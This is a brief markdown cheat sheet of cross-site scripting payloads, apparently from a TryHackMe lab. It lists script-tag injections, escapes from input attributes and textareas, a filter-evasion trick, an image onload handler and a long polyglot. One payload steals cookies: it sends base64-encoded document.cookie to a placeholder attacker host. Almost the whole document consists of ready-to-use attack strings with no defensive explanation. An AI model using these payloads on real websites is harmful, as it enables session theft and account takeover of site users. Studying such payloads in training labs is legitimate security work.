# Payloads

## Classic

```
<script>alert('THM');</script>
```

## Escape input tag

```
"><script>alert('THM');</script>
```

## Other

```
';alert('THM');//
```

```
</textarea><script>alert('THM');</script>
```

Incase filter removes script

```
<sscriptcript>alert('THM');</sscriptcript>
```

Enter An Image Path

```
 /images/cat.jpg" onload="alert('THM');
```

**Steal cookie**

```
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script> 
```

## Polyglots

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3ejaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
